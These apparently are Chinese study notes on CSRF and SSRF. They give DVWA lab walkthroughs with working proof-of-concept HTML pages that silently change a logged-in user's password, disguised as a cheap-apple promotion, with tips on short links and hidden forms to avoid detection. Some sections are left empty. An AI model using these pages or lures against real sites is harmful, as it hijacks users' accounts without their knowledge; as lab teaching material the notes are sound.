# CSRF攻击与防御

# 1.CSRF攻击概述

## 1.1 概述

```shell
CSRF 全称为跨站请求伪造(Cross-site request forgery)，
也被称为one-click attack或者session riding。
CSRF攻击利用网站对于用户网页浏览器的信任
挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。

#注意
CSRF 漏洞属于业务逻辑性的漏洞，漏洞的出现主要原因在于服务器端∶
1、服务对于用户提交的重要请求缺少了确认机制或二次身份认证
2、漏洞扫描程序无法识别此类漏洞

#CSRF 漏洞利用条件:
1.目标客户端已经完成身份认证
2.新请求的提交不需要重新身份认证或确认机制
```

## 1.2 XSS与CSRF的区别

```shell
XSS是利用了客户端对服务端的信息。

CSRF是利用站点已经完成的身份认证的信任。

二者可以结合起来使用，效果更好。
```

## 1.3 利用CSRF攻击的常见场景

```shell
修改用户账号密码；
修改某账号已关联的emali；
修改手机号码；
修改收货地址；
网银(转账请求)；
投票；
媒体社交关注(非法金融推广)；

以上在用户非自愿，不知情的情况下提交了请求。
```

## 1.4 防范手段

### 1.4.1 修改密码时

```shell
要求用户输入原密码
用户输入新的密码时，要求输入验证码
```

### 1.4.2 转账/投票时

```shell

```

# 2.DVWA靶场中的low级别的CSRF攻击

## 2.1 攻击过程

```shell
1.打开dvwa靶场

2.设置DVWA Security 的 security level 级别为 low

3.选择CSRF

4.输入密码：123456 并重复

5.获取修改密码的链接
http://10.102.224.206:9093/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change

6.在kali中启动apache
service apache2 start

7.进入kali的/var/www/html目录，编辑一个文件
vi csrf_low.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>9.9领取苹果</title>
</head>
<body>
    <a href="http://10.102.224.206:9093/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change">
        9.9领取苹果
    </a>
</body>
</html>
测试是否能访问成功 http://10.102.224.103/csrf_low.html

8.在win10浏览器重新登录DVWA(此时密码是123456)

9.在该浏览器中打开页面
http://10.102.224.103/csrf_low.html (这个链接要生成短链接)
点击超链接“9.9领取苹果”，此时跳转到到DVWA的密码修改成功页面

10.在win10浏览器重新登录DVWA，此时密码改为了123

#注意：
第7步要替换成更隐蔽的方式，因为当鼠标hover上去的时候，会露馅。
vi csrf_low_hidden.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>9.9领取苹果</title>
</head>
<!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.102.224.206:9093/vulnerabilities/csrf/">
      <input type="hidden" name="password&#95;new" value="123" />
      <input type="hidden" name="password&#95;conf" value="123" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="9.9抢购苹果" />
    </form>
  </body>
</html>
```



## 2.2 原因分析

```shell
代码层对修改密码这个功能，没有做任何校验和验证。
```



# 3.DVWA靶场中的medium级别的CSRF攻击



## 3.1 攻击过程

```shell
1.打开dvwa靶场

2.设置DVWA Security 的 security level 级别为 medium
(记得要用chrome浏览器)

3.选择CSRF
点击由下级的view source，看链接是否是
http://10.102.224.206:9093/vulnerabilities/view_source.php?id=csrf&security=medium
记得只有结尾是medium，才表示修改成功。

4.f12打开控制台：
在修改密码的输入框，输入密码：123456 并重复，然后提交。


5.获取修改密码的链接
http://10.102.224.206:9093/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change

6.在kali中启动apache
service apache2 start

7.进入kali的/var/www/html目录，
创建目录，目录名以访问目标的域名/ip为名称，这里是：
mkdir 10.102.224.206
cd 
编辑一个文件
vi csrf_medium.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>9.9领取苹果</title>
</head>
<body>
    <a href="http://10.102.224.206:9093/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change">
        9.9领取苹果
    </a>
</body>
</html>
测试是否能访问成功 http://10.102.224.103/10.102.224.206/csrf_medium.html

8.在win10浏览器重新登录DVWA(此时密码是123456)

9.在该浏览器中打开页面
http://10.102.224.103/10.102.224.206/csrf_medium.html (这个链接要生成短链接)
点击超链接“9.9领取苹果”，此时跳转到到DVWA的密码修改成功页面

10.在win10浏览器重新登录DVWA，此时密码改为了123

```

## 3.2 原因分析

```shell
原始代码中仅仅校验了refer的ip地址，当用户伪造了refer时，就绕过了。
```



# 4.DVWA靶场中的high级别的CSRF攻击



# 5.DVWA靶场中的impossible级别的CSRF攻击



```shell
对于敏感操作，如修改密码，转账等，不仅仅校验了token信息，同时增加了校验原始密码。
```



# 6.CSRFTester 工具自动化探测

```shell
探测目的是:
对于web应用程序是否具有CSRF 漏洞的防御措施。

CSRFTester是CSRF漏洞的测试工具。

CSRFTester原理：

```



# 7.CSRF预防措施

```shell
1.TOKEN验证
2.HTTP REFER 头校验
3.HTTP 自定义校验头部信息
4.验证码校验/原密码校验(适用于修改密码的风险操作)
```



[CSRF自动化测试-CSRFTester | LuckySec](http://luckyzmj.cn/posts/a1b686d3.html)

[CSRFTester &amp; burpsuite之CSRF测试 - 走看看](http://t.zoukankan.com/forforever-p-12733474.html)



# 8.SSRF

## 8.1 概述

```shell
#概念
SSRF(Server-Side Request Forgery:服务器端请求伪造)
是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。
一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。
SSRF 形成的原因大都是由于
服务端提供了从其他服务器应用获取数据的功能
且没有对目标地址做过滤与限制。
比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。


#SSRF漏洞原理︰
服务端提供了从其他服务器获取数据的功能，但没有对内网目标地址做过滤与限制。

#主要方式:
1.对外网服务器所在内网，本地进行端口扫描，获取 Banner信息。
2.测试运行在内网或本地的应用程序。
3.利用file协议读取本地文件等。
这个漏洞的危害在各大SRC 平始上都是很低位的漏洞，所以目前就直先了解一下。

一般客户端直接访问不了内网资源的，但是服务端是可以访问内网资源的，
要是服务端存在 SSRF 漏洞的话，客户端就可以利用服务端SSRF 漏洞，访问内网资源。
一般情况下，SSRF 的目标就是与外部隔离的内网资源。
```
